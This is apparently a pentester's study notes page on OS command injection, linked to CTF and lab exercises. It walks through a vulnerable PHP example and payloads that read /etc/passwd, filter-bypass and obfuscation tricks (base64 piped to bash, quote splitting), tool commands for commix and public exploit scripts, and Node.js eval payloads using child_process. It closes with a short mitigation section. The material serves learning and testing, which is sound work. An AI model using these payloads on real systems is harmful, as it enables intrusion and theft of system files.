# Command injection

[![oscommandinjection](../../../../_badges/thmp/oscommandinjection.svg)](https://tryhackme.com/room/oscommandinjection)
[![owasptop10](../../../../_badges/thm/owasptop10.svg)](https://tryhackme.com/room/owasptop10)
[![command_injection](../../../../_badges/poat/command_injection.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
[![picklerick](../../../../_badges/thm-p/picklerick.svg)](https://tryhackme.com/room/picklerick)
[![ignite](../../../../_badges/thm-p/ignite.svg)](https://tryhackme.com/room/ignite)
[![chillhack](../../../../_badges/thm-p/chillhack.svg)](https://tryhackme.com/room/chillhack)
[![commandinjections](../../../../_badges/htb/commandinjections.svg)](https://academy.hackthebox.com/course/preview/command-injections)
[![sau](../../../../_badges/htb-p/sau.svg)](https://app.hackthebox.com/machines/Sau)
[![celestial](../../../../_badges/htb-p/celestial.svg)](https://app.hackthebox.com/machines/Celestial)
[![busqueda](../../../../_badges/htb-p/busqueda.svg)](https://app.hackthebox.com/machines/Busqueda)
[![php_command_injection](../../../../_badges/rootme/web_server/php_command_injection.svg)](https://www.root-me.org/en/Challenges/Web-Server/PHP-Command-injection)
[![command_injection_filter_bypass](../../../../_badges/rootme/web_server/command_injection_filter_bypass.svg)](https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass)
[![node_eval](../../../../_badges/rootme/web_server/node_eval.svg)](https://www.root-me.org/en/Challenges/Web-Server/Node-Eval)

<div class="row row-cols-lg-2"><div>

A command injection occurs when a developer uses the user input in system commands without proper sanitization/measures.

For instance, a PHP website on Linux might use `grep`, `sed`, or other utilities instead of PHP functions for some operations:

```php!
$search = $_GET['q'];
$res = system("grep \"$search\" content/");
echo "<pre>$res</pre>";
```

With the following payload for `q`: `" -V; cat /etc/passwd #`, the command executed will be as follows, allowing us to steal /etc/passwd

```bash!
grep "" -V; cat /etc/passwd # content/
```
</div><div>

There are two kinds of command injections

* **Regular/in-band**: same channel to attack and gather results
* **Blind/out-band**: different channels to attack and gather results
    * Using redirections/flags, create a URL-accessible output file

```bash!
[...] cat /etc/passwd > /var/www/html/output.txt [...]
```

<ul>

* Using commands such as `sleep` to perform a time-based attack

</ul>

```bash!
[...] true && sleep 5 [...]
```
</div></div>

<hr class="sep-both">

## Basic Overview

<div class="row row-cols-lg-2"><div>

Assuming we have a list of vulnerable elements such as forms that may be vulnerable, we can try common payloads:

* `;` ‚Äî `%3B` ‚Äî run two commands
* `\n` ‚Äî `%0A` ‚Äî run two commands
* `&&` ‚Äî `%26%26` ‚Äî executed if the previous ones succeed
* `||` ‚Äî `%7C%7C` ‚Äî executed if the previous ones failed
* `&` ‚Äî `%26` ‚Äî run two commands <small>(background previous)</small>
* `|` ‚Äî `%7C` ‚Äî run two commands  <small>(pipe previous one)</small>
* <code>&#96;&#96;</code> ‚Äî `%60%60` ‚Äî execute a command in another command
* `$()` ‚Äî `%24%28%29` ‚Äî execute a command in another command
* `\n` or `\r\n` ‚Äî `%0a` or `%0d%0a` ‚Äî run two commands
* `!x` ‚Äî bash-specific, replaced with the command n¬∞x in history
* `{id,}` ‚Äî bash-specific, replaced with `id`

Always try to inject bit by bit using a boolean-based approach.
</div><div>

**Tools** üìö

* [Commix](https://github.com/commixproject/commix) <small>(4.3k ‚≠ê)</small> can detect and automatically exploit applications. It was coded in a similar way that SQLMap for SQL injections.

```ps
$ pipx install git+https://github.com/commixproject/commix.git
$ commix -u 'URL' -d 'xxx=*' # POST request, xxx vulnerable
```

* For manual testing, you can use [onectf request](https://github.com/QuentinRa/onectf/blob/main/docs/request.md) <small>(0.001k ‚≠ê)</small> that automatically [URL encode](/tools-and-frameworks/knowledge/encoding/index.md#url-encoding---) the payload.

```ps
$ pipx install git+https://github.com/QuentinRa/onectf.git
$ onectf request -u 'URL' -v -X POST -p 'xxx' -i 'x;id'
$ onectf request -u 'URL' -v -X POST -p 'xxx' -i 'x;ls<tab>/'
$ onectf request -u 'URL' -v -X POST -p 'xxx' -i 'x;ls /' --tamper aliases,space2tab
```
</div></div>

<hr class="sep-both">

## Bypass filters

[![bypass_bash_restrictions](../../../../_badges/hacktricks/bypass_bash_restrictions.svg)](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions)

<div class="row row-cols-lg-2"><div>

#### Character Filtering

[![chillhack](../../../../_badges/thm-p/chillhack.svg)](https://tryhackme.com/room/chillhack)

Bypass **space** character filtering.

* Try using tabs (`%09`)
* Try using variables (`${IFS}`)
* Try using brace expansion (`{ls,-la}`) -- bash
* ...

Bypass **slash** character filtering.

* Try using variables (`${PATH:0:1}`) -- may not be set
* Try using variables (`${HOME:0:1}`) -- may not be set
* Try using variables (`${PWD:0:1}`)
* Try using brace expansion (`{ls,-la}`) -- bash
* ...

‚û°Ô∏è See also: `printenv` or `env` to list exploitable variables.

#### Bypass using obfuscation

Remember that such payloads may contain filtered characters. See also tools such as [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator).

```ps
$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$ $(a="WhOaMi";printf %s "${a,,}")
$ # using base64
$ base64 <<< whoami
d2hvYW1pCg==
$ bash<<<$(base64 -d<<<d2hvYW1pCg==) # whoami
$ # using UTF-16 and base64
$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```
</div><div>

#### Command Filtering

[![chillhack](../../../../_badges/thm-p/chillhack.svg)](https://tryhackme.com/room/chillhack)
[![powershell_basic_jail](../../../../_badges/rootme/app_script/powershell_basic_jail.svg)](https://www.root-me.org/en/Challenges/App-Script/Powershell-Basic-jail)

Put pair of quotes/double quotes anywhere within the command

```ps
# available on Linux, Windows (PowerShell)
$ w'ho'ami ; w""hoam''i
```

* Put `\\` or `$@` anywhere within the command

```ps
# available on Linux
$ w\ho\am\i ; who$@ami
```

* Put `^` anywhere within the command

```ps
# available on Windows (CMD)
CMD> who^am^i
```

* Reverse commands

```ps
$ $(rev<<<'imaohw')
PS> iex "$('imaohw'[-1..-20] -join '')"
```

* Filters may have been applied only once

```ps
PS> cat # It doesn't work.
PS> ccatat # It works!
```

* Use variables to split the command

```ps
PS> $a="l"; $b="s" ; & $a$b
```
</div></div>

<hr class="sep-both">

## Additional Notes

Refer to [injection](/cybersecurity/red-team/s4.privesc/linux/utils/injection.md#special-scenarios-) if you need to inject something in the arguments of a custom script.

<div class="row row-cols-lg-2"><div>

#### Mailtrail v0.53

[![sau](../../../../_badges/htb-p/sau.svg)](https://app.hackthebox.com/machines/Sau)

[POC (python script)](https://github.com/spookier/Maltrail-v0.53-Exploit) <small>(0.04k ‚≠ê)</small>.

```shell!
$ python3 exploit.py listener_ip listener_port URL
```

<br>

#### Searchor 2.4.2

[![busqueda](../../../../_badges/htb-p/busqueda.svg)](https://app.hackthebox.com/machines/Busqueda)

[Poc (python script)](https://github.com/jonnyzar/POC-Searchor-2.4.2) <small>(0.01k ‚≠ê)</small>.

```shell!
$ onectf request -u URL -X POST -d 'engine=Yahoo' -p query -i '<q>, exec(""))#'
```

You can execute python code inside `exec`.

<br>

#### PHP 'eval' function

[![php_eval](../../../../_badges/rootme/web_server/php_eval.svg)](https://www.root-me.org/en/Challenges/Web-Server/PHP-Eval)

[Refer to HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#rce-via-eval) for the payloads. If the parameter is filtered, we can tried PHP specific bypasses such as [PHP octal](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#execute-php-without-letters).

<br>

#### Perl open()

[![perl_command_injection](../../../../_badges/rootme/app_script/perl_command_injection.svg)](https://www.root-me.org/en/Challenges/App-Script/Perl-Command-injection)

The open function is perl can execute commands when we use `|` in the filename. For instance, `| cat /etc/passwd`. The code is not vulnerable if there is a `<` before our filename in the `open` function call.
</div><div>

#### Node.js 'eval' function

[![glitch](../../../../_badges/thm-p/glitch.svg)](https://tryhackme.com/r/room/glitch)
[![celestial](../../../../_badges/htb-p/celestial.svg)](https://app.hackthebox.com/machines/Celestial)
[![node_eval](../../../../_badges/rootme/web_server/node_eval.svg)](https://www.root-me.org/en/Challenges/Web-Server/Node-Eval)

If the input is evaluated using eval, we can write some code  in it.

* Normal input: `5`
* Normal input wrapped: `(()=>{return 5})()`
* If it works, we can add some code in-between

```js!
(() => {
  try {
    return `Output: ${require('child_process').execSync('whoami').toString()}`
  } catch (error) {
    return `Error executing command: ${error}`
  }
})()
// without spaces
(()=>{try{return(`Output:${require('child_process').execSync('whoami').toString()}`)}catch(error){return(`Error:${error}`)}})()
```

It's not always possible to return a string, but if errors are returned, you may use them instead of the usual vector.

```js!
(()=>{throw new Error(require("child_process").execSync("whoami").toString())})()
res.end(require('fs').readdirSync('.').toString())
res.end(require('fs').readFileSync('file').toString())
```

#### Node.js 'eval' function

[![powershell_command_injection](../../../../_badges/rootme/app_script/powershell_command_injection.svg)](https://www.root-me.org/en/Challenges/App-Script/Powershell-Command-Injection)
[![powershell_basic_jail](../../../../_badges/rootme/app_script/powershell_basic_jail.svg)](https://www.root-me.org/en/Challenges/App-Script/Powershell-Basic-jail)

Reminder of useful payloads: `$(whoami)`, `; whoami`, `$(Get-ChildItem Env:)`, `$(command|Out-string)`, `| powershell command`...
</div></div>

<hr class="sep-both">

## Mitigation üõ°Ô∏è

<div class="row row-cols-lg-2"><div>

* ü™≤ Avoid using uncontrolled input in system commands. Always validate and filter user input.

* üî´ Use the web engine functions instead of system functions

* üìö Use additional tools such as a WAF, etc.
</div><div>

As always, we can configure the server to block some functions or disable access to folders outside the application directories.

* [PHP Security And Bypasses](/programming-languages/web/php/_general/index.md#php-security-and-bypasses-)
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* Windows Slash (`$env:HOMEPATH[0]`)
* Direct access to a program in a jail?
</div><div>
</div></div>